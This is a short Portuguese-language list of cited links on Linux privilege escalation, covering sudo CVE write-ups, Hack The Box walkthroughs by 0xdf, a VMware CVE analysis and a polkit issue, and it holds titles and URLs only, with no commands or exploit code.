- [18] [Sudo Parte 2 – Escalação de privilégios no Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
...
- [22] [0xdf – HTB Eureka (injeção aritmética do bash via logs, cadeia completa)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
...
- [26] [0xdf – HTB Slonik (cópia via cron do pg_basebackup → bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Você nomeia, o VMware eleva (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: escalação de privilégios via Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Vulnerabilidades de escalação de privilégios do Sudo: CVE-2025-32462 e CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
...
- [33] [Problema #74 do polkit/polkit](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
